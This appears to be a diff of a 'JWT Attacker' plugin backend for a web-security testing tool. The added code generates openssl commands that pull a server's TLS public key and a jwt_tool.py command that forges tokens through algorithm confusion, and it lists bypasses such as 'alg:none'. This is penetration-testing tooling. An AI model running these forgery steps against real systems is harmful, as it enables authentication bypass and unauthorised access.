+    `openssl s_client -connect ${o.host}:${o.port} -servername ${o.host} </dev/null 2>/dev/null \\`,
+    "  | openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER > /tmp/tlskey.der",
+    "",
+    "# Compare \u2014 identical files prove the JWTs are signed with the server's TLS key:",
+    "cmp /tmp/recoveredkey /tmp/tlskey.der && echo 'MATCH: JWT key == server TLS key'"
+  ];
+  if (o.includeForge) {
+    lines.push(
+      "",
+      "# Forge a token via algorithm confusion using that key as the HMAC secret:",
+      `python3 jwt_tool.py ${o.originalJWT} -X k -pk /tmp/recoveredkey`
+    );
+  }
+  return lines.join("\n");
 }
 var BYPASS_TITLES = {
   none: "JWT 'alg:none' accepted (signature stripped)",
@@ -2285,6 +3059,7 @@ function init(sdk) {
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
   sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
   sdk.api.register("runRecoveredConfusion", runRecoveredConfusion);
+  sdk.api.register("netSelfTest", netSelfTest);
   sdk.console.log("[JWT Attacker] backend init() complete");
 }
 export {
